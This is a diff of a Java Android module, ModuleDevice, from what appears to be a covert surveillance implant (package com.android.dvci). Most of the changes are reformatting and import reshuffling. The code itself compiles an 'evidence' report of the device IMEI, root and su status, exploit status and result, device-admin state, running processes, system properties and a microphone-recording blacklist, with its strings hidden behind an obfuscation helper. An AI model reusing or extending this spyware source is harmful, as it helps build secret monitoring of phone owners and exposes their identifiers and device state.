@@ -7,23 +7,11 @@
 
 package com.android.dvci.module;
 
-import java.io.BufferedReader;
-import java.io.FileInputStream;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.util.ArrayList;
-import java.util.Iterator;
-import java.util.List;
-import java.util.Map.Entry;
-import java.util.Properties;
-
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.content.pm.PackageInfo;
-import android.content.pm.PackageManager;
 import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Environment;
@@ -33,6 +21,7 @@ import com.android.dvci.Device;
 import com.android.dvci.RunningProcesses;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
+import com.android.dvci.capabilities.PackageInfo;
 import com.android.dvci.conf.ConfModule;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
@@ -42,28 +31,49 @@ import com.android.dvci.util.PackageUtils;
 import com.android.dvci.util.WChar;
 import com.android.mm.M;
 
+import java.io.BufferedReader;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.util.ArrayList;
+import java.util.Iterator;
+import java.util.Map.Entry;
+import java.util.Properties;
+
+import static com.android.dvci.capabilities.PackageInfo.*;
+
+
 /**
  * http://android.git.kernel.org/?p=platform/packages/apps/Settings.git;a=tree;f
  * =src/com/android/settings;h=1d1b538ef4728c9559da43828a7df9e9bb5c512f;hb=HEAD
- * 
+ *
  * @author zeno
- * 
  */
 public class ModuleDevice extends BaseInstantModule {
 
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "ModuleDevice"; //$NON-NLS-1$
 
-	/** The process list. */
+	/**
+	 * The process list.
+	 */
 	private boolean processList = true;
 
-	/** The cpu usage. */
+	/**
+	 * The cpu usage.
+	 */
 	private float cpuUsage;
 
-	/** The cpu total. */
+	/**
+	 * The cpu total.
+	 */
 	private long cpuTotal;
 
-	/** The cpu idle. */
+	/**
+	 * The cpu idle.
+	 */
 	private long cpuIdle;
 
 	/**
@@ -103,7 +113,7 @@ public class ModuleDevice extends BaseInstantModule {
 			}
 
 			final Runtime runtime = Runtime.getRuntime();
-			
+
 			readCpuUsage();
 
 			if (Cfg.DEBUG) {
@@ -118,22 +128,22 @@ public class ModuleDevice extends BaseInstantModule {
 			int battery = getBattery(sb);
 			getProperties(sb);
 			getProcessList(sb);
-			
+
 			ComponentName devAdminReceiver = new ComponentName(Status.getAppContext(), AR.class);
 			DevicePolicyManager dpm = (DevicePolicyManager) Status.getAppContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
 			boolean admin = dpm.isAdminActive(devAdminReceiver);
-			boolean root = Status.self().haveRoot();
+			boolean root = checkRoot();
 			boolean su = Status.self().haveSu();
-			
+
 			sb.insert(0, M.e("Model:") + Build.DISPLAY + "\n");
 			sb.insert(0, M.e("IMEI: ") + Device.self().getImei() + "\n");
-			sb.insert(0, M.e("Root: ") + (root?"yes":"no") + ", status="+Status.getExploitStatusString()+", result="+Status.getExploitResultString()
-					+ M.e(", Su: ") + (su?"yes":"no")  + " "
-					+ M.e(", Admin: ") + (admin?"yes":"no") + "\n");
+			sb.insert(0, M.e("Root: ") + (root ? "yes" : "no") + ", status=" + Status.getExploitStatusString() + ", result=" + Status.getExploitResultString()
+					+ M.e(", Su: ") + (su ? "yes" : "no") + " "
+					+ M.e(", Admin: ") + (admin ? "yes" : "no") + "\n");
 			sb.insert(0, M.e("Free space: ") + freeSpace + " KB" + "\n");
 			sb.insert(0, M.e("Battery: ") + battery + "%" + "\n");
-			
-			
+
+
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (actualStart) Error: " + ex);
@@ -163,7 +173,7 @@ public class ModuleDevice extends BaseInstantModule {
 
 	private void getProperties(final StringBuffer sb) {
 		final Properties properties = System.getProperties();
-		
+
 		sb.append("\n" + M.e("-- PROPERTIES --") + "\n"); //$NON-NLS-1$
 		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();
 
@@ -205,48 +215,48 @@ public class ModuleDevice extends BaseInstantModule {
 		sb.append(M.e("External space: ") + bytesAvailableExt + "\n");
 
 		RunningProcesses runningProcesses = new RunningProcesses();
-		sb.append(M.e("Foreground process: ") +runningProcesses.getForeground() + "\n"); //$NON-NLS-1$
-		
+		sb.append(M.e("Foreground process: ") + runningProcesses.getForeground() + "\n"); //$NON-NLS-1$
+
 		ModuleMic mic = ModuleMic.self();
-		if(mic != null){
+		if (mic != null) {
 			sb.append("MIC blacklist: ");
 			for (String black : mic.blacklist) {
 				sb.append(black + " ");
 			}
 			sb.append("\n");
 		}
-		
+
 		return bytesAvailableInt / 1024;
 	}
 
 	private int getBattery(final StringBuffer sb) {
 		sb.append("\n" + M.e("-- BATTERY --") + "\n");
-		
+
 		IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
 		Intent batteryStatus = Status.self().getAppContext().registerReceiver(null, ifilter);
 		// Are we charging / charged?
 		int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
 		boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
-		                     status == BatteryManager.BATTERY_STATUS_FULL;
-		
+				status == BatteryManager.BATTERY_STATUS_FULL;
+
 		sb.append(M.e("Charging: ") + isCharging + "\n");
 
 		// How are we charging?
 		int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
 		boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
 		boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
-		
+
 		sb.append(M.e("Charging USB: ") + usbCharge + "\n");
 		sb.append(M.e("Charging AC: ") + acCharge + "\n");
-		
+
 		int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
 		int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
 
-		
+
 		float levelBattery = level / (float) scale;
 		sb.append(M.e("level: ") + levelBattery + "\n");
-		
-		int batteryPct = level * 100 / scale ;
+
+		int batteryPct = level * 100 / scale;
 		return batteryPct;
 	}
 
@@ -279,9 +289,6 @@ public class ModuleDevice extends BaseInstantModule {
 			}
 		}
 	}
-
-
-
 
 
 }
